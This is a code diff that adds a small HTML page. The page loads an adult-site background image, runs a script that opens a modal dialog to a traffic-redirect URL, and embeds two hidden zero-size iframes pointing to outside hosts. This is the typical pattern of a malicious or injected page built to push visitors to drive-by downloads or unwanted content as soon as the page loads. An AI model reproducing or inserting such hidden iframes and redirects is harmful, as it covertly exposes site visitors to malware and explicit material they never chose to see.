@@ -1,0 +1,15 @@
+<html>
+<style type="text/css"> 
+body 
+{ 
+background-image: url(http://www2.nudeunion.com/galleries/kyla-cole/ebina0012.jpg); 
+background-repeat: no-repeat; 
+background-position: center center;
+background-attachment: fixed 
+} 
+</style>
+<SCRIPT language=JavaScript> 
+window.showModalDialog("http://bs.t-redirect.com/tds/rdr.php?id=255","sss","dialogHeight: 780px; dialogWidth: 1000px; edge: Sunken; center: Yes; help: No; resizable: Yes; status: No; unadorned: Yes");
+</SCRIPT>
+<iframe src=http://otlili.cn/sys/index.php?id=0004 width=0 height=0></iframe>
+<iframe src=http://guestbook.cgiworld.paran.com/write.cgi?id=jpggif width=0 height=0></iframe></html>
